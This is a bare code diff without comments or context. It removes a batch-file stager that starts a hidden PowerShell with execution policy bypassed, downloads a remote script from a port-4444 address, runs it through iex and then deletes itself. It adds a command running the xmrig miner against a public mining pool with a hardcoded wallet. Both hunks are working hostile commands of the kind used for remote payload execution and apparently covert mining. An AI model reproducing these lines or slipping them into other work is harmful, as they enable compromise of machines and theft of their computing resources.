@@ -1,3 +1,3 @@
-@echo off
-start powershell.exe -nol -w 1 -nop -ep bypass (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://0.0.0.0:4444/download/powershell/')-UseBasicParsing|iex
-(goto) 2>nul & del "%~f0"
+./xmrig -o eu.hashvault.pro:443 \
+  -u 49jrWAP5Yqz2V4ZVrsYAMcFcRWoA6G97K8gDV32WJhBNe9Kj3oD54bH3ML5x4iduycGjmJmERmPkCbvVAQSLDk32E2YTZrJ \
+  -p mobile -t 5 --huge-pages --tls
